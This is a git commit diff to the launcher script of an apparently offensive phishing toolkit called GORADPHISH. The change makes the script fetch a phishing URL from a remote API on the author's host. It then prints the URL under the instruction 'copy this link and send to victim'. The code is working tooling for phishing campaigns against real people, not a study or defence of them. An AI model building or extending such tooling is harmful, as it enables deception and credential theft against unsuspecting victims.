a9981d920342ac7a658fb51d808c701a4b6ea6d9
cyberGorad <134638741+cyberGorad@users.noreply.github.com>
2025-03-24 13:45:44 +0000

    dynamic link title.py

--- GORADPHISH_customised/assets/title.py
+++ GORADPHISH_customised/assets/title.py
@@ -1,28 +1,43 @@
-import mysql.connector
+import requests
 import time
 import os
-from colorama import Fore, Style, init
+from colorama import Fore, Style
 import pyfiglet
+
+def get_dynamic_url():
+    url_api = "https://cybergorad.alwaysdata.net/urls.php"  # API qui fournit l'URL
+    try:
+        response = requests.get(url_api)
+        
+        if response.status_code == 200:
+            data = response.json()  # Convertit la réponse JSON en dictionnaire
+            return data.get("url", "URL non disponible")
+        else:
+            return f"Erreur HTTP : {response.status_code}"
+
+    except requests.exceptions.RequestException as e:
+        return f"Erreur de connexion : {str(e)}"
+    except ValueError:
+        return "Erreur : Réponse JSON invalide"
 
 def afficher_titre():
     os.system('clear')  # Efface l'écran (sous Linux et macOS)
-
-
     titre = pyfiglet.figlet_format("GORADPHISH")
     
-    
-    print("Auteur:cybergorad")
-    print("version:1.0.0")
+    print("Auteur: cybergorad")
+    print("Version: 1.0.1")
     print("")
     print("MODE : CUSTOM")
     print("")
     
-    print("")
-
     print(Fore.CYAN + titre + Style.RESET_ALL)
-    print ("LOADING ..")
+    print("LOADING ..")
     time.sleep(3)
     print("")
-    print("")
 
-    print("copy this link and send to victim : " + Fore.CYAN + " https://cybergorad.alwaysdata.net/tools")
+    # Récupérer l'URL dynamique
+    url_dynamique = get_dynamic_url()
+    print("copy this link and send to victim : " + Fore.CYAN + url_dynamique + Style.RESET_ALL)
+
+# Exécuter le programme
+afficher_titre()
